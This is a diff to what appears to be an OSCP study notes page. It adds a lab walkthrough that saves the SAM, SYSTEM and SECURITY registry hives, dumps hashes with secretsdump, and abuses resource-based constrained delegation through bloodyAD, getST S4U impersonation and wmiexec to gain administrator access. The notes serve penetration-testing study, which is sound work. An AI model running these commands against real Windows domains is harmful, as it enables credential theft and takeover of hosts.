@@ -422,6 +422,44 @@ vssadmin create shadow /for=C:
 
 This creates a point-in-time snapshot of C:. Locked files such as `ntds.dit` can then be copied through the shadow device path. The command requires SYSTEM on the target.
 
+## RockyColt: local registry hives to a machine-account hash
+
+```cmd
+reg save HKLM\SAM C:\Temp\SAM /y
+reg save HKLM\SYSTEM C:\Temp\SYSTEM /y
+reg save HKLM\SECURITY C:\Temp\SECURITY /y
+```
+
+- `SAM` contains local account hashes.
+- `SYSTEM` contains the boot key used to decrypt SAM and LSA data.
+- `SECURITY` contains LSA secrets, including the machine-account secret on many member hosts.
+
+```bash
+secretsdump.py -sam $BoxDir/loot/SAM -system $BoxDir/loot/SYSTEM -security $BoxDir/loot/SECURITY LOCAL
+```
+
+`LOCAL` selects offline hive parsing. The machine-account line is the useful result for RBCD. Keep the hash private and preserve the trailing `$` in the account name.
+
+## RockyColt: RBCD and the S4U chain
+
+```bash
+bloodyAD -u $Username -p $Password -d $Domain --host $BoxIP add rbcd $TargetComputer $MachineAccount
+getST.py -spn "cifs/$FQDN" -impersonate $AdminUser -dc-ip $BoxIP "$Domain/$MachineAccount" -hashes ":$NThash"
+KRB5CCNAME=$BoxDir/loot/Administrator.ccache wmiexec.py -k -no-pass $FQDN
+```
+
+- `add rbcd` writes the security descriptor to the target computer's RBCD attribute.
+- `-spn cifs/$FQDN` requests a ticket for the SMB service.
+- `-impersonate $AdminUser` selects the identity represented by the S4U ticket.
+- `-hashes :$NThash` authenticates the controlled computer account with its NT hash.
+- `KRB5CCNAME` selects the ccache used by the Kerberos-aware client.
+
+The first WMI failure in RockyColt was name resolution. A valid ticket still needs the target FQDN to resolve locally.
+
+## RockyColt: why generic RBCD attribute writes failed
+
+`msDS-AllowedToActOnBehalfOfOtherIdentity` is a binary security descriptor, not a normal string-valued LDAP attribute. A generic `set object -v` call attempted to encode the account name as a descriptor and failed. `bloodyAD add rbcd` is the correct abstraction because it resolves the service-account SID and constructs the descriptor.
+
 ## External Resources
 
 - [HackTricks - Pentesting Index](https://hacktricks.wiki/en/index.html)
@@ -440,3 +478,4 @@ This page turns one repeatable part of an authorized assessment into a checklist
 ## Demonstrated in box write-ups
 
 - [[OSCP/BOXES/WRITE UPS/AD/Forest|Forest]] -- demonstrates the workflow described here
+- [[OSCP/BOXES/WRITE UPS/AD/RockyColt|RockyColt]] -- demonstrates why RBCD needs a binary security descriptor and how the S4U chain consumes it
